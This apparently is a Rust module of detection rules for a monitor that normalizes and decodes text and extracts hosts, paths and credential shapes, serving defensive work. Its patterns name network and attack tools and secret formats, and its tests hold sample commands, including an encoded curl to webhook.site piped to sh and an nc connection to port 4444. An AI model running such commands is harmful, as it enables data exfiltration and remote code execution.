//! The text rules of the tripwires: patterns, extraction of hosts, paths and credential shapes, and the decoding of
//! encoded runs (`docs/MONITOR.md` §2.4, §6.1).
//!
//! CONTRACT.
//!
//! - Every function is pure and bounded: input is cut at `MAX_SCAN_BYTES` (on a character boundary) before it is
//!   scanned, a pattern never backtracks (the `regex` crate), and at most `MAX_RUNS` encoded runs are decoded.
//! - `normalize(text)` removes zero-width and bidirectional control characters (U+200B to U+200F, U+202A to U+202E,
//!   U+2060 to U+2064, U+2066 to U+2069, U+FEFF) and maps the fullwidth forms of ASCII (U+FF01 to U+FF5E) to ASCII, so
//!   `ｎｉｐ.ｉｏ` and `ni\u{200b}p.io` match as `nip.io`. Every tripwire matches the normalized text.
//! - `decoded_views(text)` returns the decoded text of every run of 8 bytes or more that is base64 (standard or
//!   URL-safe), hex or percent-encoded, when the decoding is mostly printable UTF-8. gzip runs are not decoded here
//!   (deferred to M6, which has the input builder's decompressor): a run that is gzip shows as nothing.
//! - `hosts_in(text)` returns the host names and addresses a text sends something to: the authority of every URL
//!   (`scheme://user@host:port/…`, userinfo and port removed), and the host argument of `curl`, `wget`, `nc`, `ncat`,
//!   `telnet`, `ssh`, `scp`, `nmap`, `hydra`, `ffuf` and `sqlmap`. It does not take file names (`main.py`) for hosts.
//!   `urls_in(text)` returns the URLs themselves. `paths_in(text)` returns the path-like tokens (absolute, `~`, `$HOME`,
//!   `./`, `../`), without a URL's path.
//! - `without_urls(text)` is the text with every URL cut out: the `.git/config` of a URL aimed at a target is not a
//!   local path (§6.1).
//! - `credential_kinds(text)` names the credential shapes in a text (`aws-key`, `github-token`, `slack-token`,
//!   `openai-key`, `google-key`, `jwt`, `private-key`); it never returns the value. `credential_values(text)` returns
//!   the values for the monitor's own index only; they are hashed (`value_tag`) before they are kept and are never
//!   written to the monitor log.
//! - `registrable_domain(host)` is the last two labels of a host, or three when the second-level label is a known
//!   public suffix part (`co.uk`, `com.au`, …); an address is its own.
//!
//! Tests required: `normalize_removes_what_hides_a_name`, `encoded_runs_are_decoded_before_matching`,
//! `hosts_are_the_destinations_not_file_names`, `credential_shapes_are_named_and_never_returned_by_kind`,
//! `registrable_domains`, `every_pattern_compiles`, `scanning_is_bounded`.

use regex::Regex;
use std::sync::LazyLock;

/// The most a scan reads of one text.
pub const MAX_SCAN_BYTES: usize = 256 * 1024;
/// The most encoded runs one text has decoded.
pub const MAX_RUNS: usize = 32;
/// The shortest encoded run that is decoded (§2.4).
pub const MIN_RUN: usize = 8;

/// A pattern that was compiled once; one that does not compile never matches and is reported by `compile_failures`.
pub struct Re {
    re: Option<Regex>,
}

impl Re {
    pub fn new(pattern: &str) -> Re {
        Re { re: Regex::new(pattern).ok() }
    }

    pub fn ok(&self) -> bool {
        self.re.is_some()
    }

    pub fn is_match(&self, text: &str) -> bool {
        self.re.as_ref().is_some_and(|r| r.is_match(text))
    }

    /// Every non-overlapping match, as text.
    pub fn find_all<'a>(&self, text: &'a str) -> Vec<&'a str> {
        self.re.as_ref().map(|r| r.find_iter(text).map(|m| m.as_str()).collect()).unwrap_or_default()
    }

    /// The first capture group of every match.
    pub fn group1<'a>(&self, text: &'a str) -> Vec<&'a str> {
        self.re
            .as_ref()
            .map(|r| r.captures_iter(text).filter_map(|c| c.get(1).map(|m| m.as_str())).collect())
            .unwrap_or_default()
    }

    /// The first two capture groups of every match.
    pub fn captures2<'a>(&self, text: &'a str) -> Vec<(&'a str, &'a str)> {
        self.re
            .as_ref()
            .map(|r| r.captures_iter(text).filter_map(|c| Some((c.get(1)?.as_str(), c.get(2)?.as_str()))).collect())
            .unwrap_or_default()
    }

    /// The first match, as text.
    pub fn first<'a>(&self, text: &'a str) -> Option<&'a str> {
        self.re.as_ref().and_then(|r| r.find(text)).map(|m| m.as_str())
    }
}

macro_rules! patterns {
    ($( $(#[$m:meta])* $name:ident => $re:expr; )*) => {
        $( $(#[$m])* pub static $name: std::sync::LazyLock<$crate::monitor::patterns::Re> = std::sync::LazyLock::new(|| $crate::monitor::patterns::Re::new($re)); )*
        /// The names of the patterns that do not compile (none, in a correct build).
        pub fn compile_failures() -> Vec<&'static str> {
            let mut bad = Vec::new();
            $( if !$name.ok() { bad.push(stringify!($name)); } )*
            bad
        }
    };
}

pub(crate) use patterns;

patterns! {
    URL => r#"(?i)\b(?:https?|wss?|ftp|sftp|ssh|git|tcp|redis|postgres(?:ql)?|mysql|mongodb)://[^\s'"<>`)\]}]+"#;
    URL_AUTHORITY => r#"(?i)\b[a-z][a-z0-9+.-]*://([^\s/'"<>`?#)\]}]+)"#;
    NET_COMMAND_HOST => r#"(?i)(?:^|[\s;&|(])(?:curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|nmap|hydra|ffuf|sqlmap|gobuster|nikto|wfuzz)\s+(?:-[^\s]+\s+(?:[0-9]+\s+)?)*(?:[A-Za-z0-9._-]+@)?((?:[a-z0-9-]+\.)+[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:]+\])(?::\d{1,5})?(?:[\s/]|$)"#;
    PATH_TOKEN => r#"(?:^|[\s='"(<>:,;|&])((?:~|\$HOME|\$\{HOME\}|\.{1,2}|/)[A-Za-z0-9_@%+=:,./~$-]{1,300})"#;
    BASE64_RUN => r"[A-Za-z0-9+/_-]{8,}={0,2}";
    HEX_RUN => r"\b(?:[0-9a-fA-F]{2}){4,}\b";
    PERCENT_RUN => r"(?:%[0-9a-fA-F]{2}[A-Za-z0-9._~-]{0,3}){3,}";
    CRED_AWS => r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b";
    CRED_GITHUB => r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}\b|\bgithub_pat_[A-Za-z0-9_]{40,}\b";
    CRED_SLACK => r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b";
    CRED_OPENAI => r"\bsk-(?:proj-|live-|ant-)?[A-Za-z0-9_-]{24,}\b";
    CRED_GOOGLE => r"\bAIza[0-9A-Za-z_-]{35}\b";
    CRED_JWT => r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b";
    CRED_PRIVATE_KEY => r"-----BEGIN (?:[A-Z]+ )?PRIVATE KEY-----";
    HUGGINGFACE => r"\bhf_[A-Za-z0-9]{30,}\b";
}

/// Remove what hides a name (zero-width and bidirectional controls) and fold fullwidth ASCII to ASCII.
pub fn normalize(text: &str) -> String {
    text.chars()
        .filter(
            |c| !matches!(*c as u32, 0x200B..=0x200F | 0x202A..=0x202E | 0x2060..=0x2064 | 0x2066..=0x2069 | 0xFEFF),
        )
        .map(|c| match c as u32 {
            n @ 0xFF01..=0xFF5E => char::from_u32(n.saturating_sub(0xFF01).saturating_add(0x21)).unwrap_or(c),
            0x3000 => ' ',
            _ => c,
        })
        .collect()
}

/// `text` cut to `max` bytes on a character boundary.
pub fn cut(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut end = max;
    while end > 0 && !text.is_char_boundary(end) {
        end = end.saturating_sub(1);
    }
    text.get(..end).unwrap_or("")
}

fn b64_value(c: u8) -> Option<u8> {
    match c {
        b'A'..=b'Z' => Some(c.saturating_sub(b'A')),
        b'a'..=b'z' => Some(c.saturating_sub(b'a').saturating_add(26)),
        b'0'..=b'9' => Some(c.saturating_sub(b'0').saturating_add(52)),
        b'+' | b'-' => Some(62),
        b'/' | b'_' => Some(63),
        _ => None,
    }
}

/// Decode base64 (standard or URL-safe alphabet, padding optional); `None` for anything that is not.
pub fn base64_decode(run: &str) -> Option<Vec<u8>> {
    let body = run.trim_end_matches('=');
    if body.len() < MIN_RUN || body.len() % 4 == 1 {
        return None;
    }
    let mut out = Vec::with_capacity(body.len() / 4 * 3 + 3);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in body.bytes() {
        acc = (acc << 6) | u32::from(b64_value(c)?);
        bits = bits.saturating_add(6);
        if bits >= 8 {
            bits = bits.saturating_sub(8);
            out.push(((acc >> bits) & 0xFF) as u8);
        }
    }
    Some(out)
}

fn hex_decode(run: &str) -> Option<Vec<u8>> {
    if !run.len().is_multiple_of(2) {
        return None;
    }
    let digit = |c: u8| match c {
        b'0'..=b'9' => Some(c.saturating_sub(b'0')),
        b'a'..=b'f' => Some(c.saturating_sub(b'a').saturating_add(10)),
        b'A'..=b'F' => Some(c.saturating_sub(b'A').saturating_add(10)),
        _ => None,
    };
    let b = run.as_bytes();
    let mut out = Vec::with_capacity(b.len() / 2);
    for pair in b.chunks(2) {
        let (hi, lo) = (digit(*pair.first()?)?, digit(*pair.get(1)?)?);
        out.push((hi << 4) | lo);
    }
    Some(out)
}

fn percent_decode(run: &str) -> Vec<u8> {
    let b = run.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0usize;
    while let Some(&c) = b.get(i) {
        if c == b'%' {
            let pair = b.get(i.saturating_add(1)..i.saturating_add(3)).and_then(|p| std::str::from_utf8(p).ok());
            if let Some(v) = pair.and_then(|p| u8::from_str_radix(p, 16).ok()) {
                out.push(v);
                i = i.saturating_add(3);
                continue;
            }
        }
        out.push(c);
        i = i.saturating_add(1);
    }
    out
}

fn mostly_text(bytes: &[u8]) -> Option<String> {
    let s = std::str::from_utf8(bytes).ok()?;
    let total = s.chars().count();
    if total < 4 {
        return None;
    }
    let printable = s.chars().filter(|c| !c.is_control() || matches!(c, '\n' | '\t' | '\r')).count();
    (printable.saturating_mul(10) >= total.saturating_mul(9)).then(|| s.to_string())
}

/// The decoded text of each encoded run of 8 bytes or more in `text` (see the contract).
pub fn decoded_views(text: &str) -> Vec<String> {
    let text = cut(text, MAX_SCAN_BYTES);
    let mut out: Vec<String> = Vec::new();
    for run in PERCENT_RUN.find_all(text).into_iter().take(MAX_RUNS) {
        if let Some(s) = mostly_text(&percent_decode(run)) {
            out.push(s);
        }
    }
    for run in HEX_RUN.find_all(text).into_iter().take(MAX_RUNS) {
        if let Some(s) = hex_decode(run).and_then(|b| mostly_text(&b)) {
            out.push(s);
        }
    }
    for run in BASE64_RUN.find_all(text).into_iter().take(MAX_RUNS) {
        // A word of plain letters ("configuration") decodes to noise; it is not a run unless it mixes cases or digits.
        let mixed = run.bytes().any(|b| b.is_ascii_digit())
            || (run.bytes().any(|b| b.is_ascii_uppercase()) && run.bytes().any(|b| b.is_ascii_lowercase()));
        if !mixed {
            continue;
        }
        if let Some(s) = base64_decode(run).and_then(|b| mostly_text(&b)) {
            out.push(s);
        }
    }
    out
}

/// `text` normalized, with the decoded views of its encoded runs appended on their own lines: what a tripwire matches.
pub fn scan_form(text: &str) -> String {
    let mut s = normalize(cut(text, MAX_SCAN_BYTES));
    for v in decoded_views(&s) {
        s.push('\n');
        s.push_str(&normalize(&v));
    }
    s
}

/// The URLs in `text`.
pub fn urls_in(text: &str) -> Vec<String> {
    URL.find_all(cut(text, MAX_SCAN_BYTES))
        .into_iter()
        .map(|u| u.trim_end_matches(['.', ',', ';', ':', '!', '?', '"', '\'']).to_string())
        .collect()
}

/// `text` with every URL cut out.
pub fn without_urls(text: &str) -> String {
    let text = cut(text, MAX_SCAN_BYTES);
    let mut out = String::with_capacity(text.len());
    let mut last = 0usize;
    if let Some(re) = URL.re.as_ref() {
        for m in re.find_iter(text) {
            out.push_str(text.get(last..m.start()).unwrap_or(""));
            out.push(' ');
            last = m.end();
        }
    }
    out.push_str(text.get(last..).unwrap_or(""));
    out
}

/// The host of an authority: userinfo and port removed, brackets of an IPv6 address kept off, lowercased.
pub fn host_of_authority(authority: &str) -> String {
    let a = authority.rsplit('@').next().unwrap_or(authority);
    let host = if let Some(rest) = a.strip_prefix('[') {
        rest.split(']').next().unwrap_or(rest)
    } else {
        a.split(':').next().unwrap_or(a)
    };
    host.trim_end_matches('.').to_lowercase()
}

/// The port of an authority, when it has one.
pub fn port_of_authority(authority: &str) -> Option<u16> {
    let a = authority.rsplit('@').next().unwrap_or(authority);
    let tail = if a.starts_with('[') { a.split("]:").nth(1) } else { a.split_once(':').map(|(_, p)| p) };
    tail.and_then(|p| p.trim_end_matches('/').parse().ok())
}

/// The destinations `text` sends something to (see the contract), lowercased, each once, in order.
pub fn hosts_in(text: &str) -> Vec<String> {
    let text = cut(text, MAX_SCAN_BYTES);
    let mut out: Vec<String> = Vec::new();
    let mut push = |h: String| {
        if !h.is_empty() && !out.contains(&h) {
            out.push(h);
        }
    };
    for a in URL_AUTHORITY.group1(text) {
        push(host_of_authority(a));
    }
    for h in NET_COMMAND_HOST.group1(text) {
        push(host_of_authority(h.trim_matches(['[', ']'])));
    }
    out
}

/// The path-like tokens of `text`, URLs left out.
pub fn paths_in(text: &str) -> Vec<String> {
    let bare = without_urls(text);
    PATH_TOKEN
        .group1(&bare)
        .into_iter()
        .map(|p| p.trim_end_matches([',', ';', ':', '.']).to_string())
        .filter(|p| p.len() > 1)
        .collect()
}

/// The credential shapes in `text`, by kind (no value).
pub fn credential_kinds(text: &str) -> Vec<&'static str> {
    let text = cut(text, MAX_SCAN_BYTES);
    let table: [(&LazyLock<Re>, &'static str); 8] = [
        (&CRED_AWS, "aws-key"),
        (&CRED_GITHUB, "github-token"),
        (&CRED_SLACK, "slack-token"),
        (&CRED_OPENAI, "openai-key"),
        (&CRED_GOOGLE, "google-key"),
        (&CRED_JWT, "jwt"),
        (&CRED_PRIVATE_KEY, "private-key"),
        (&HUGGINGFACE, "huggingface-token"),
    ];
    table.iter().filter(|(re, _)| re.is_match(text)).map(|(_, k)| *k).collect()
}

/// The credential values in `text`, for the monitor's own index (hashed before they are kept, never logged).
pub fn credential_values(text: &str) -> Vec<String> {
    let text = cut(text, MAX_SCAN_BYTES);
    let mut out: Vec<String> = Vec::new();
    for re in [&CRED_AWS, &CRED_GITHUB, &CRED_SLACK, &CRED_OPENAI, &CRED_GOOGLE, &CRED_JWT, &HUGGINGFACE] {
        out.extend(re.find_all(text).into_iter().map(str::to_string));
    }
    out.truncate(64);
    out
}

/// A short, non-reversible tag of a value: the first 16 hex characters of its SHA-256.
pub fn value_tag(value: &str) -> String {
    let full = loom_core::sha256_hex(value.as_bytes());
    full.get(..16).unwrap_or(&full).to_string()
}

const SECOND_LEVEL: [&str; 10] = ["co", "com", "org", "net", "gov", "edu", "ac", "ne", "or", "go"];

/// The registrable domain of `host` (see the contract).
pub fn registrable_domain(host: &str) -> String {
    let h = host.trim_end_matches('.').to_lowercase();
    if h.parse::<std::net::IpAddr>().is_ok() {
        return h;
    }
    let labels: Vec<&str> = h.split('.').collect();
    let n = labels.len();
    if n <= 2 {
        return h;
    }
    let tld_len = labels.last().map_or(0, |l| l.len());
    let second = labels.get(n.saturating_sub(2)).copied().unwrap_or("");
    let take = if tld_len == 2 && SECOND_LEVEL.contains(&second) { 3 } else { 2 };
    labels.get(n.saturating_sub(take)..).map(|l| l.join(".")).unwrap_or(h)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_pattern_compiles() {
        assert_eq!(compile_failures(), Vec::<&str>::new());
    }

    #[test]
    fn normalize_removes_what_hides_a_name() {
        assert_eq!(normalize("ni\u{200b}p.io"), "nip.io");
        assert_eq!(normalize("\u{202e}evil.example"), "evil.example");
        assert_eq!(normalize("ｎｉｐ.ｉｏ"), "nip.io");
        assert_eq!(normalize("plain text"), "plain text");
    }

    #[test]
    fn encoded_runs_are_decoded_before_matching() {
        // "curl https://webhook.site/x" as base64, hex and percent-encoding.
        let b64 = "Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS94";
        let hex = "6375726c2068747470733a2f2f776562686f6f6b2e736974652f78";
        let pct = "%63%75%72%6c%20%68%74%74%70%73%3a%2f%2f%77%65%62%68%6f%6f%6b%2e%73%69%74%65";
        for run in [b64, hex, pct] {
            let seen = decoded_views(&format!("echo {run} | sh"));
            assert!(seen.iter().any(|s| s.contains("webhook") && s.contains("site")), "{run}: {seen:?}");
        }
        assert!(decoded_views("configuration").is_empty(), "a plain word is not a run");
        assert!(decoded_views("abc").is_empty(), "a run is 8 bytes or more");
        assert!(scan_form("run Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS94").contains("webhook.site"));
    }

    #[test]
    fn hosts_are_the_destinations_not_file_names() {
        let t =
            "curl -s -H 'x: y' https://User:pw@Api.Example.test:8443/path?q=1 && python main.py && nc 10.0.0.5 4444";
        assert_eq!(hosts_in(t), vec!["api.example.test", "10.0.0.5"]);
        assert!(hosts_in("python main.py; cat notes.txt").is_empty());
        assert_eq!(host_of_authority("[::1]:80"), "::1");
        assert_eq!(port_of_authority("a.test:8080"), Some(8080));
        assert_eq!(port_of_authority("[::1]:81"), Some(81));
        assert_eq!(port_of_authority("a.test"), None);
        assert_eq!(hosts_in("ssh -p 2222 root@jump.example.test uptime"), vec!["jump.example.test"]);
    }

    #[test]
    fn paths_leave_urls_out() {
        let p = paths_in("cat ~/.loom/config.toml && curl https://t.test/.git/config -o ./out ; ls /etc/hosts");
        assert!(p.contains(&"~/.loom/config.toml".to_string()), "{p:?}");
        assert!(p.contains(&"./out".to_string()) && p.contains(&"/etc/hosts".to_string()), "{p:?}");
        assert!(!p.iter().any(|x| x.contains(".git/config")), "{p:?}");
        assert!(!without_urls("a https://x.test/p b").contains("x.test"));
    }

    #[test]
    fn credential_shapes_are_named_and_never_returned_by_kind() {
        let aws = format!("key {}", "AKIA".to_string() + "ABCDEFGHIJKLMNOP");
        assert_eq!(credential_kinds(&aws), vec!["aws-key"]);
        let gh = format!("t {}_{}", "ghp", "a".repeat(36));
        assert_eq!(credential_kinds(&gh), vec!["github-token"]);
        assert_eq!(credential_kinds("-----BEGIN OPENSSH PRIVATE KEY-----"), vec!["private-key"]);
        assert!(credential_kinds("nothing here, just a sk- prefix").is_empty());
        let vals = credential_values(&aws);
        assert_eq!(vals.len(), 1);
        let tag = value_tag(vals.first().map_or("", |v| v.as_str()));
        assert_eq!(tag.len(), 16);
        assert!(!tag.contains("AKIA"));
    }

    #[test]
    fn registrable_domains() {
        assert_eq!(registrable_domain("a.b.example.com"), "example.com");
        assert_eq!(registrable_domain("x.example.co.uk"), "example.co.uk");
        assert_eq!(registrable_domain("example.com"), "example.com");
        assert_eq!(registrable_domain("10.1.2.3"), "10.1.2.3");
        assert_eq!(registrable_domain("Host."), "host");
    }

    #[test]
    fn scanning_is_bounded() {
        let big = "a".repeat(MAX_SCAN_BYTES * 2);
        assert!(cut(&big, MAX_SCAN_BYTES).len() <= MAX_SCAN_BYTES);
        let multi = "é".repeat(10);
        assert_eq!(cut(&multi, 5).chars().count(), 2, "cut on a character boundary");
        let runs = (0..200).map(|i| format!("QWxwaGFCZXRh{i} ")).collect::<String>();
        assert!(decoded_views(&runs).len() <= MAX_RUNS * 3);
    }
}
